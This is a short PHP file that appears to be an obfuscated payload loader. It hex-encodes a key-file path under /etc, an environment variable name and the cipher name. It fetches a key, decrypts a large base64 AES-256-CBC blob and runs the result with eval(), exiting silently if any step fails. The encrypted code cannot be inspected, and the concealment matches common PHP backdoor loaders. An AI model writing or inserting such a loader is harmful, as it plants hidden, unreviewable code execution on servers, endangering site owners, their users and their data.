<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('LKPjLAn+N58eJlk7ogHTqg==');

$c=base64_decode(

'1J0oEMe3jHsjczTsXot/pq4pebISB1E+gQAxStD/qdt16dvOUjUj9UQgM+hPhLzj6nKGUt8AOQWy' .
'4TlsdmIHiRbEyOo3xE0bEAwrO+scQRsSqm8fr1tACckbPOlKWRw1i0T2DQIaXM3OgIjfbY2M5PGB' .
'xQrCADOp4SzRBzjujJtNxm8g7JXpY1H5BbsoVpycfMdwRo+IOyVbQowfk5VL0fV3n44vPYbjGjQW' .
'G/eUy7Jt4EI+n0nOZsOB2isacniu2XMr00o1xpRZqn/ZyNdqAJ1X1qiYACRQX7rq3NomDE9CaB2f' .
'O4IIvj6wTmVVodZGXb3g1CUESP0ZMtq3vz5aXVT9ZtNTIaAsphHl0GVJl80SOgeAuNzZIna4UUXb' .
'5+fbjX3BJcq/NupNcNOu7Mmhc4WZMiZyACRdDW9c96I1BlXWlxlqGPmG9Nirv2AnH03xBkLqmu11' .
'm2ImX73Yne/Mcu6G9JjuViPIQXMMXBhf/eNS9kqi7FiBmHljb7yxUw9d6M0PaGcesrbnxfaq8wdF' .
'4r9uqvfKs5a+u9R3opBWaiETqVG7IhVVvRVEaTFvsKulnifx/m2Cb747hSfu+UMSI+oa1AyTIE7r' .
'KW3ROI3BUKCuzWDJYsCOGxdF0naerQ30phM6VOSJdj4JCWF1eKZ4dznoJEx2YvivVv5s00vUCvya' .
'B4g6Nzf8T8qRrHxWnps1sYrotImAmRdZPhw0hJgMcYvKGb1mc4KMpKej6x1F2PgThB8n+UivNRVM' .
'5mvWojD6kt7O7xHZAdHQynhKFyYT1U7jc0qPi6iQ7ZjxeDBqhqV9akbPb8NWcI6GxHiIECyLRNMC' .
'bP/1RUcYgK7RIBji2IxaLAOC/irw92zByO2yEHzUNiK/aPIR2zbJBC2tcA5MJ2039pul1z1Jkwsr' .
'KkiyXzqaH3l4S7IHVZ4JHPpRgxAGTAWDox5ngbt/RFGJmEgjd1H2lBddZvpXqIFbvzsDqud2IIs8' .
'L0dNmEXYiMktskn0ujvqJU/BP8o7VIHytthLve6940/cMeupMwPviWLhydKt5qjzUHVKOYcURUfK' .
'q8HaEsbjbpZWRPGdCsAcZ6jV4+dgLgam0bNSoZBIyxlCTsF04PZVMIxWS1O7bOTKIEhEf7e1t+nr' .
'z1Aqwvn0IHBIgBvkkRZdFRq8iEISYSO+BPZGjZBjRrqu4A7AFSaGtf+K8MgcWtRBBXjwKx/PChwo' .
'Y/nc1Jv2USe0sw4aFHiHUxJu3UiKP/tiwFKm1Ab0IgpyrtxJz0vAGvfz6poOjBVeYRPRR5Xozl6o' .
'dtbEnkcXgwNLfXrwz+97TrkhDnEh6bc2zDj4WA4N6p3NfRXI6Tx6RVqPX+NJj1Zlgex1ZdQZag=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

